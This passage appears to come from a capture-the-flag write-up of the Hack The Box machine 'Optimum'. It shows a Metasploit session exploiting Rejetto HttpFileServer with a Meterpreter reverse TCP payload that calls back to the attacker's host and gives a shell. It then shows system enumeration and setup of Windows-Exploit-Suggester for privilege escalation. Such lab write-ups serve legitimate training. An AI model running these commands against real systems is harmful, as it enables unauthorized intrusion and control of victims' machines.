</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --rm -it -v <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">HOME</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/.msf:/home/msf/&#34;</span> -p 4444:4444 -p 1337:1337 -p <span style="color:#8be9fd;font-style:italic">$1</span>:<span style="color:#8be9fd;font-style:italic">$1</span> metasploitframework/metasploit-framework ./msfconsole
msf6 &gt; search HFS

Matching <span style="color:#8be9fd;font-style:italic">Modules</span>
<span style="color:#ff79c6">================</span>

   <span style="color:#6272a4">#  Name                                        Disclosure Date  Rank       Check  Description</span>
   -  ----                                        ---------------  ----       -----  -----------
   <span style="color:#bd93f9">0</span>  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   <span style="color:#bd93f9">1</span>  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 1, use <span style="color:#bd93f9">1</span> or use exploit/windows/http/rejetto_hfs_exec

msf6 &gt; use exploit/windows/http/rejetto_hfs_exec
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit<span style="color:#ff79c6">(</span>windows/http/rejetto_hfs_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 10.10.10.8
<span style="color:#8be9fd;font-style:italic">RHOSTS</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.8
msf6 exploit<span style="color:#ff79c6">(</span>windows/http/rejetto_hfs_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 10.10.14.38
<span style="color:#8be9fd;font-style:italic">LHOST</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
msf6 exploit<span style="color:#ff79c6">(</span>windows/http/rejetto_hfs_exec<span style="color:#ff79c6">)</span> &gt; exploit

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> ...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:42548<span style="color:#ff79c6">)</span> at 2020-09-18 17:12:04 +0000

meterpreter &gt; shell
...
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;whoami
whoami
optimum<span style="color:#f1fa8c">\k</span>ostas

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop

25/09/2020  05:10 ��    &lt;DIR&gt;          .
25/09/2020  05:10 ��    &lt;DIR&gt;          ..
25/09/2020  05:10 ��    &lt;DIR&gt;          %TEMP%
18/03/2017  03:11 ��           760.320 hfs.exe
18/03/2017  03:13 ��                <span style="color:#bd93f9">32</span> user.txt.txt
               <span style="color:#bd93f9">2</span> File<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>        760.352 bytes
               <span style="color:#bd93f9">3</span> Dir<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>  31.861.149.696 bytes free
</code></pre></td></tr></table>
</div>
</div><h1 id="explore-system-info">Explore system info</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;cmd /c systeminfo
cmd /c systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server <span style="color:#bd93f9">2012</span> R2 Standard
OS Version:                6.3.9600 N/A Build <span style="color:#bd93f9">9600</span>
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          25/9/2020, 5:08:55 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>:              <span style="color:#bd93f9">1</span> Processor<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Installed.
                           <span style="color:#ff79c6">[</span>01<span style="color:#ff79c6">]</span>: AMD64 Family <span style="color:#bd93f9">23</span> Model <span style="color:#bd93f9">49</span> Stepping <span style="color:#bd93f9">0</span> AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:<span style="color:#f1fa8c">\W</span>indows
System Directory:          C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32
Boot Device:               <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English <span style="color:#ff79c6">(</span>United States<span style="color:#ff79c6">)</span>
Time Zone:                 <span style="color:#ff79c6">(</span>UTC+02:00<span style="color:#ff79c6">)</span> Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.519 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.709 MB
Virtual Memory: In Use:    <span style="color:#bd93f9">794</span> MB
Page File Location<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>:     C:<span style="color:#f1fa8c">\p</span>agefile.sys
Domain:                    HTB
Logon Server:              <span style="color:#f1fa8c">\\</span>OPTIMUM
Hotfix<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>:                 <span style="color:#bd93f9">31</span> Hotfix<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Installed.
                           <span style="color:#ff79c6">[</span>01<span style="color:#ff79c6">]</span>: KB2959936
                           <span style="color:#ff79c6">[</span>02<span style="color:#ff79c6">]</span>: KB2896496
                           <span style="color:#ff79c6">[</span>03<span style="color:#ff79c6">]</span>: KB2919355
                           <span style="color:#ff79c6">[</span>04<span style="color:#ff79c6">]</span>: KB2920189
                           <span style="color:#ff79c6">[</span>05<span style="color:#ff79c6">]</span>: KB2928120
                           <span style="color:#ff79c6">[</span>06<span style="color:#ff79c6">]</span>: KB2931358
                           <span style="color:#ff79c6">[</span>07<span style="color:#ff79c6">]</span>: KB2931366
                           <span style="color:#ff79c6">[</span>08<span style="color:#ff79c6">]</span>: KB2933826
                           <span style="color:#ff79c6">[</span>09<span style="color:#ff79c6">]</span>: KB2938772
                           <span style="color:#ff79c6">[</span>10<span style="color:#ff79c6">]</span>: KB2949621
                           <span style="color:#ff79c6">[</span>11<span style="color:#ff79c6">]</span>: KB2954879
                           <span style="color:#ff79c6">[</span>12<span style="color:#ff79c6">]</span>: KB2958262
                           <span style="color:#ff79c6">[</span>13<span style="color:#ff79c6">]</span>: KB2958263
                           <span style="color:#ff79c6">[</span>14<span style="color:#ff79c6">]</span>: KB2961072
                           <span style="color:#ff79c6">[</span>15<span style="color:#ff79c6">]</span>: KB2965500
                           <span style="color:#ff79c6">[</span>16<span style="color:#ff79c6">]</span>: KB2966407
                           <span style="color:#ff79c6">[</span>17<span style="color:#ff79c6">]</span>: KB2967917
                           <span style="color:#ff79c6">[</span>18<span style="color:#ff79c6">]</span>: KB2971203
                           <span style="color:#ff79c6">[</span>19<span style="color:#ff79c6">]</span>: KB2971850
                           <span style="color:#ff79c6">[</span>20<span style="color:#ff79c6">]</span>: KB2973351
                           <span style="color:#ff79c6">[</span>21<span style="color:#ff79c6">]</span>: KB2973448
                           <span style="color:#ff79c6">[</span>22<span style="color:#ff79c6">]</span>: KB2975061
                           <span style="color:#ff79c6">[</span>23<span style="color:#ff79c6">]</span>: KB2976627
                           <span style="color:#ff79c6">[</span>24<span style="color:#ff79c6">]</span>: KB2977629
                           <span style="color:#ff79c6">[</span>25<span style="color:#ff79c6">]</span>: KB2981580
                           <span style="color:#ff79c6">[</span>26<span style="color:#ff79c6">]</span>: KB2987107
                           <span style="color:#ff79c6">[</span>27<span style="color:#ff79c6">]</span>: KB2989647
                           <span style="color:#ff79c6">[</span>28<span style="color:#ff79c6">]</span>: KB2998527
                           <span style="color:#ff79c6">[</span>29<span style="color:#ff79c6">]</span>: KB3000850
                           <span style="color:#ff79c6">[</span>30<span style="color:#ff79c6">]</span>: KB3003057
                           <span style="color:#ff79c6">[</span>31<span style="color:#ff79c6">]</span>: KB3014442
Network Card<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>:           <span style="color:#bd93f9">1</span> NIC<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Installed.
                           <span style="color:#ff79c6">[</span>01<span style="color:#ff79c6">]</span>: Intel<span style="color:#ff79c6">(</span>R<span style="color:#ff79c6">)</span> 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address<span style="color:#ff79c6">(</span>es<span style="color:#ff79c6">)</span>
                                 <span style="color:#ff79c6">[</span>01<span style="color:#ff79c6">]</span>: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required <span style="color:#ff79c6">for</span> Hyper-V will not be displayed.

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;exit
<span style="color:#8be9fd;font-style:italic">exit</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="finding-a-privesc-exploit">Finding a privesc exploit</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: OPTIMUM<span style="color:#f1fa8c">\k</span>ostas
meterpreter &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /Users/kostas/Desktop
meterpreter &gt; execute -f <span style="color:#f1fa8c">&#34;cmd /c systeminfo &gt; system.info&#34;</span>
meterpreter &gt; download system.info
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: system.info -&gt; system.info
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Error running <span style="color:#8be9fd;font-style:italic">command</span> download: Errno::EACCES Permission denied @ rb_sysopen - system.info
</code></pre></td></tr></table>
</div>
</div><p>We fail to download because our local folder is not writable, let&rsquo;s move to /tmp</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /tmp
msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#ff79c6">)</span> &gt; sessions <span style="color:#bd93f9">1</span>
meterpreter &gt; download system.info
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: system.info -&gt; system.info
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloaded 3.26 KiB of 3.26 KiB <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: system.info -&gt; system.info
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> download   : system.info -&gt; system.info
</code></pre></td></tr></table>
</div>
</div><p>Installing Windows-Exploit-Suggester</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git /opt/Windows-Exploit-Suggester
pip install python-xlrd
python2 windows-exploit-suggester.py --update
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> initiating winsploit version 3.3...
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> writing to file 2020-09-19-mssb.xls
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><p>Looking for exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
